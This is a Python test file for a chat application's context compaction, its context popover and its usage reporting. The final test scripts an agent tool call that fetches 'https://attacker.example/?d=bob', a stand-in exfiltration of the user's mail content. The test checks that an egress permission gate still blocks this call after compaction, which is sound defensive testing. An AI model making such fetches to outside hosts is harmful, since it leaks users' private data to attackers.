"""Compaction and the context popover on the new runtime (ticket #67).

Driven through the routes the browser calls: POST /api/chat_stream (with the
real context builder, so the stored history is what the next request
replays), GET /api/session/{id}/context (the popover) and POST
/api/session/{id}/compact (the Compact button), plus the Chat Completions
adapter that reports the usage the trigger reads.
"""

import json

import httpx
import pytest

import core.models as core_models
import routes.chat_helpers as chat_helpers
import routes.chat_routes as chat_routes
import src.context_compactor as context_compactor
import src.search.content as search_content
from core.models import ChatMessage
from src.chat_agent import transcript
from src.chat_agent.providers import Endpoint, RoundEnd, Usage, chat_completions
from tests.chat_agent.test_chat_agent_route import (
    _Harness,
    _Request,
    _TextUploads,
    _data_events,
    _sse_events,
    _sse_tool_calls,
    _switch_on,
)

WINDOW = 1_000
LOW_THRESHOLD = 50
SUMMARY = "SUMMARY: the user checked mail and fetched two pages."


def _usage_chunk(input_tokens, output_tokens=20, **extra):
    return "data: " + json.dumps({"choices": [], "usage": {
        "prompt_tokens": input_tokens, "completion_tokens": output_tokens, **extra,
    }})


def _with_usage(body, input_tokens, output_tokens=20):
    """Append a usage chunk (as stream_options makes servers send) to a scripted round."""
    return body.replace(
        b"data: [DONE]", _usage_chunk(input_tokens, output_tokens).encode() + b"\n\ndata: [DONE]",
    )


# --- The adapter reports usage ------------------------------------------------


@pytest.mark.asyncio
async def test_chat_completions_round_reports_usage_with_cached_input(monkeypatch):
    payloads = []

    def provider(request):
        payloads.append(json.loads(request.content))
        usage = _usage_chunk(1200, 30, prompt_tokens_details={"cached_tokens": 1000},
                             completion_tokens_details={"reasoning_tokens": 5})
        body = _sse_events(["Hi"]).replace(b"data: [DONE]", usage.encode() + b"\n\ndata: [DONE]")
        return httpx.Response(200, content=body, headers={"content-type": "text/event-stream"})

    client = httpx.AsyncClient(transport=httpx.MockTransport(provider))
    monkeypatch.setattr(chat_completions, "_get_http_client", lambda: client)
    endpoint = Endpoint("http://localhost:1234/v1", "local-model", None)

    events = [e async for e in chat_completions.stream_round(
        endpoint, [{"role": "user", "content": "hi"}], temperature=0.2, max_tokens=0,
    )]

    [end] = [e for e in events if isinstance(e, RoundEnd)]
    assert end.usage == Usage(input_tokens=1200, cached_input_tokens=1000, output_tokens=30, reasoning_tokens=5)
    assert payloads[0]["stream_options"] == {"include_usage": True}


# --- Auto compaction at a turn boundary, through the chat route -------------


class _Manager:
    """The session manager's DB write: replace_messages swaps the whole history."""

    def __init__(self, session):
        self.session = session
        self.replaced = 0

    def replace_messages(self, session_id, messages):
        self.replaced += 1
        for index, message in enumerate(messages):
            message.metadata = dict(message.metadata or {}, _db_id=f"replaced-{self.replaced}-{index}")
        self.session.history = list(messages)
        return True


@pytest.fixture
def chat(monkeypatch, tmp_path):
    """The chat route with the real context builder, so each turn replays the stored history."""
    from src.chat_handler import ChatHandler
    from src.chat_processor import ChatProcessor

    handler = ChatHandler(
        session_manager=None, memory_manager=None, chat_processor=None,
        research_handler=None, preset_manager=None, upload_handler=_TextUploads(tmp_path / "none.txt"),
    )
    harness = _Harness(monkeypatch, tmp_path, chat_handler=handler,
                       chat_processor=ChatProcessor(memory_manager=None, personal_docs_manager=None))
    session = harness.session
    session.get_context_messages = lambda: [m.to_dict() for m in session.history]
    original_add = session.add_message

    def add_message(message):
        session.history.append(message)
        original_add(message)

    session.add_message = add_message
    monkeypatch.setattr(chat_routes, "build_chat_context", chat_helpers.build_chat_context)
    monkeypatch.setattr(chat_helpers, "extract_preset", lambda *a: chat_helpers.PresetInfo(
        temperature=None, max_tokens=None, system_prompt="You are Odysseus.", character_name=None,
    ))
    monkeypatch.setattr(chat_helpers, "fire_message_event", lambda *a, **k: None)
    monkeypatch.setattr(chat_helpers, "load_prefs_for_user", lambda user: {})
    monkeypatch.setattr(chat_helpers, "effective_user", lambda request: "alice")
    monkeypatch.setattr(chat_helpers, "_normalize_model_id_from_cache", lambda sess: None)
    monkeypatch.setattr(chat_helpers, "normalize_model_id", lambda *a, **k: None)
    monkeypatch.setattr(chat_helpers, "get_context_length", lambda url, model: WINDOW)
    monkeypatch.setattr(transcript, "get_context_length", lambda url, model: WINDOW)

    async def legacy_compaction(*args, **kwargs):
        pytest.fail("legacy maybe_compact must not run on a new-runtime turn")

    monkeypatch.setattr(chat_helpers, "maybe_compact", legacy_compaction)
    monkeypatch.setattr(context_compactor, "get_setting", lambda key, default=None: (
        LOW_THRESHOLD if key == "auto_compact_threshold_percent" else default
    ))
    monkeypatch.setattr(search_content, "fetch_webpage_content",
                        lambda url, **kw: {"success": True, "content": f"page at {url}"})
    harness.summaries = []

    async def summarize(url, model, messages, **kwargs):
        harness.summaries.append(messages[-1]["content"])
        return SUMMARY

    monkeypatch.setattr(transcript, "llm_call_async", summarize)
    monkeypatch.setattr(transcript, "resolve_endpoint", lambda *a, **k: (None, None, None))
    harness.manager = _Manager(session)
    monkeypatch.setattr(core_models, "_SESSION_MANAGER_INSTANCE", harness.manager)
    # An earlier (legacy) turn read the user's mail: the chat holds private and
    # external content, so the egress gate is armed.
    session.history = [
        ChatMessage("user", "check my mail"),
        ChatMessage("assistant", "You have one new email from Bob.", metadata={"tool_events": [
            {"tool": "mcp__email__read_email", "status": "done"},
        ]}),
    ]
    _switch_on()
    return harness


async def _turn(chat, monkeypatch, message, rounds, **form):
    monkeypatch.setattr(chat_routes, "coerce_message_and_session", lambda *a, **k: (message, "session-1"))
    chat.provider_rounds = list(rounds)
    sent = len(chat.captured["provider_requests"])
    _, body = await chat.send(_Request(
        "agent", message=message, allow_web_search="true", no_memory="true", use_rag="false", **form,
    ))
    assert "event: error" not in body
    return _data_events(body), chat.captured["provider_requests"][sent:]


def _fetch(url, input_tokens):
    return [
        _with_usage(_sse_tool_calls(("web_fetch", {"url": url})), input_tokens),
        _with_usage(_sse_events([f"Read {url}."]), input_tokens + 40),
    ]


async def _two_turns(chat, monkeypatch):
    """Turn 1 stays small; turn 2's last round crosses the threshold."""
    await _turn(chat, monkeypatch, "first question", _fetch("https://one.example/", 100))
    await _turn(chat, monkeypatch, "second question", _fetch("https://two.example/", 700))


def _orphan_tool_results(messages):
    called = set()
    orphans = []
    for message in messages:
        for call in message.get("tool_calls") or ():
            called.add(call["id"])
        if message["role"] == "tool" and message["tool_call_id"] not in called:
            orphans.append(message["tool_call_id"])
    return orphans


@pytest.mark.asyncio
async def test_long_chat_compacts_at_a_turn_boundary_with_no_orphan_tool_output(chat, monkeypatch):
    await _two_turns(chat, monkeypatch)
    assert chat.summaries == []

    events, [request] = await _turn(chat, monkeypatch, "third question", [_sse_events(["Done."])])

    assert {"type": "compacted", "context_length": WINDOW} in events
    [summarized] = chat.summaries
    assert "check my mail" in summarized and "first question" in summarized
    assert "second question" not in summarized
    messages = request["messages"]
    assert _orphan_tool_results(messages) == []
    text = json.dumps(messages)
    assert SUMMARY in text
    assert "first question" not in text and "https://one.example/" not in text
    # The kept turn replays whole: its call, its result, its answer.
    assert [m["role"] for m in messages] == [
        "system", "system", "user", "assistant", "tool", "assistant", "user",
    ]
    assert "second question" in messages[2]["content"]
    assert messages[3]["tool_calls"][0]["id"] == messages[4]["tool_call_id"]
    assert messages[-1]["content"].endswith("third question")
    # The stored chat is the summary row plus the kept and new turns.
    assert [m.role for m in chat.session.history] == ["system", "user", "assistant", "user", "assistant"]
    assert chat.session.history[0].metadata["compacted"] is True


@pytest.mark.asyncio
async def test_the_egress_gate_stays_armed_after_compaction(chat, monkeypatch):
    await _two_turns(chat, monkeypatch)

    events, _ = await _turn(chat, monkeypatch, "send it on", [
        _sse_tool_calls(("web_fetch", {"url": "https://attacker.example/?d=bob"})),
        _sse_events(["I could not fetch that."]),
    ], interactive="false")

    assert {"type": "compacted", "context_length": WINDOW} in events
    [card] = [e["data"] for e in events if e.get("type") == "ask_user"]
    assert card["ask_kind"] == "permission"
    [output] = [e for e in events if e.get("type") == "tool_output"]
    assert output["exit_code"] == 126
